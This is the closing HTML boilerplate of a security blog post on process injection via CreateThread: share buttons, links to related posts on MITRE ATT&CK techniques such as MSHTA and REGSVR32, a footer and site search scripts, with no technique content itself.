href="https://t.me/share/url?url=https://cyberkhalid.github.io/posts/createthread/&amp;text=Process Injection -&gt; CreateThread - cyberkhalid" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/pcron/">Cronjob</a><li><a href="/posts/autorun/">Registry Autoruns</a><li><a href="/posts/pwautorun/">Registry Autoruns</a><li><a href="/posts/pwstartup/">Startups</a><li><a href="/posts/winprivsrvunq/">Insecure Service-> Unquoted Service Path</a></ul></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/mshta/"><div class="card-body"> <em class="timeago small" data-ts="1648763373" > 2022-04-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MSHTA</h3><div class="text-muted small"><p> MITRE ID : T1218.005 Tactic : Defense Evasion Platforms: Windows MSHTA Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. Adversaries may abuse mshta.exe to prox...</p></div></div></a></div><div class="card"> <a href="/posts/msiexec/"><div class="card-body"> <em class="timeago small" data-ts="1648763373" > 2022-04-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>MSIEXEC</h3><div class="text-muted small"><p> MITRE ID : T1218.007 Tactic : Defense Evasion Platforms: Windows MSIEXEC Msiexec.exe Is a command-line utility that Provides the means to install, modify, and perform operations on Window...</p></div></div></a></div><div class="card"> <a href="/posts/regsrv/"><div class="card-body"> <em class="timeago small" data-ts="1648763373" > 2022-04-01 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>REGSVR32</h3><div class="text-muted small"><p> MITRE ID : T1218.010 Tactic : Defense Evasion Platforms: Windows REGSVR32 Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, inc...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/rundll/" class="btn btn-outline-primary" prompt="Older"><p>RUNDLL32</p></a> <a href="/posts/sshauthkeys/" class="btn btn-outline-primary" prompt="Newer"><p>SSH Authorized Keys</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/0xcyb3rkh4l1d">cyberkhalid</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
